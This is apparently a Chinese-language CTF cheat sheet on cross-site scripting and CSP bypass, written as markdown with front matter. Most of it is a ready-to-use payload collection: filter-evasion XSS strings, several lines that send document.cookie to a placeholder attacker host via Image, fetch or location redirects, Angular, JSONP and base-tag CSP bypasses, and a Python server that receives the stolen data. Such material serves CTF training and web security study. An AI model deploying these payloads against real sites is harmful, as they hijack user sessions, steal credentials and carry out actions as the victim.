---
title: XSS 跨站脚本（含 CSP 绕过）
category: web
tags: [xss, csp, 存储型 xss, dom xss, 浏览器安全]
signals: [输入被回显到 html, 留言板, 反射型 xss, 搜索关键词回显, csp 响应头, script-src, 需要让 bot 访问链接, admin bot, cookie 是 flag, 富文本编辑]
difficulty: medium
source: "PortSwigger / PayloadsAllTheThings / OWASP"
tools: [burpsuite, chrome devtools, requests]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 搜索/留言/昵称输入被原样输出到 HTML 页面（`<h1>你搜索的是：{{q}}</h1>`）。
- 有 "admin bot" / "report URL" / "让管理员查看" 功能 → 典型 XSS 利用题。
- 响应头有 `Content-Security-Policy: script-src 'self' ...` —— 需要绕过 CSP。
- Cookie 设置了 `HttpOnly`（那就转向 CSRF/信息窃取而非读 cookie）。
- 输入过滤了 `on`、`script`、`<` 等关键词，但 `"><svg onload=...>` 能过。
- 变体：DOM XSS（`location.hash` 被 `innerHTML` 使用）、模板注入式 XSS。

## 二、原理

浏览器把 HTML 里的 `<script>` 和事件属性当代码执行。XSS 分类：

| 类型 | 数据流 | 触发方式 |
|---|---|---|
| 反射型 | 请求参数 → 响应 HTML | 诱导受害者点链接 |
| 存储型 | 数据库 → 页面 | 任何访问者自动触发 |
| DOM 型 | `location/hash` → `innerHTML/eval` | 前端 JS 自行拼接 |

**CSP 绕过**常见思路：
1. `script-src 'unsafe-inline'` → 直接内联脚本；
2. `script-src 'self'` → 上传/找同源可控 JS 文件（`.js` 上传、JSONP 端点、`/api/upload`）；
3. `script-src cdn.example.com` → 用 CDN 上的 angular/`google-analytics` 等旧库；
4. `script-src 'nonce-xxx'` → 若 nonce 复用/可猜，或页面存在 `base` 注入劫持；
5. `'strict-dynamic'` → 借 `document.createElement('script')` 注入；
6. `unsafe-eval` → `setTimeout("code")`、`Function("code")`。

## 三、解题步骤

1. 找注入点，确认是反射/存储/DOM。
2. 测试过滤：`<`, `>`, `"`, `'`, `on`, `script`, `javascript:`。
3. 用最短可用 payload 验证弹窗：`<img src=x onerror=alert(1)>`、`"><svg onload=alert(1)>`。
4. 如果是 bot 题，payload 改成主动外传：`new Image().src='//HOST/?c='+document.cookie`。
5. 有 CSP 时先读策略，再选绕过路径。
6. 起一个 HTTP 监听接收数据（`python -m http.server` 或 webhook.site）。

## 四、可直接运行的脚本

基础 payload 清单：

```html
<!-- 最通用 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- 打断属性 -->
"><svg onload=alert(1)>
'><img src=x onerror=alert(document.cookie)>

<!-- 无括号 -->
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>

<!-- 过滤 "on" 关键词 -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- 过滤 "script" -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<SCRIPT SRC=//HOST/x.js></SCRIPT>
<svg><script href=//HOST/x.js></script>

<!-- 过滤 javascript: -->
<a href="jAvAsCrIpT:alert(1)">x</a>
<a href="&#106;avascript:alert(1)">x</a>

<!-- 外带 cookie（bot 题常用） -->
<script>new Image().src='//HOST/?'+document.cookie</script>
<img src=x onerror="fetch('//HOST/?c='+btoa(document.cookie))">
<script>location='//HOST/?c='+document.cookie</script>
```

无回显 / bot 题的外带服务器：

```python
# receiver.py —— 在公网/内网可访问的机器上跑
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse, sys

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        data = urllib.parse.urlparse(self.path).query
        print("[HIT]", urllib.parse.unquote(data), flush=True)
        self.send_response(200); self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8000), H).serve_forever()
```

CSP 绕过速查：

```text
# 1. unsafe-inline
<script>fetch('//HOST/'+document.cookie)</script>

# 2. script-src 'self' -> 找同源 JSONP
<script src="/api/jsonp?callback=alert(1)//"></script>
<script src="/upload/evil.js"></script>       # 先上传一个 .js

# 3. 白名单 CDN + Angular（若白名单含 cdnjs/angular）
<div ng-app ng-csp><div ng-click="$event.view.location='//HOST/'+document.cookie">x</div></div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>

# 4. 白名单含 google/analytics -> JSONP 链
//google-analytics.com/o/oauth2/iframe?callback=alert(1)

# 5. unsafe-eval
setTimeout("fetch('//HOST/'+document.cookie)",0)

# 6. base 注入劫持相对路径
<base href="//HOST/">
# 页面里若有 <script src="/static/app.js"> 就会被引到攻击者服务器
```

## 五、常见坑 / 变体

- **`alert` 被浏览器拦截**：在真实浏览器里 `alert` 在跨域 iframe 可能失效，改用 `console.log` + headless 检查。
- **cookie `HttpOnly=true`**：`document.cookie` 读不到，改打管理员操作（CSRF 式）或读 `/admin/api` 的响应。
- **bot 访问的是 `http://` 而外带服务器是 `https://`**：混合内容被浏览器拦，用相同协议或 `//HOST/` 自适配。
- **`<script src>` 被 Trusted Types 拦**：CSP 的 `require-trusted-types-for 'script'`，需找 `innerHTML` 之外的 sink。
- 变体：**`javascript:` 需要点击**（`<a>`），bot 不点就无效，换 `onerror/onload` 自动触发。
- 变体：**XSS + CSRF 组合**：`fetch('/admin/reset', {method:'POST', body:...})`。
- 变体：**XSS 打 cookie 之外**：读 `localStorage`、读页面里的 token、用 bot 的权限直接访问 `flag` 接口。
- 变体：**mXSS**（innerHTML 二次解析），`<noscript>`、`<svg><style>` 等。

## 六、参考来源

- [PortSwigger Web Security Academy - Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP Top 10 2021 - A03 Injection (XSS)](https://owasp.org/Top10/A03_2021-Injection/)
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [HackTricks - XSS and CSP bypass](https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html)
- [MDN - Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CTF-Wiki XSS](https://ctf-wiki.org/web/xss/)
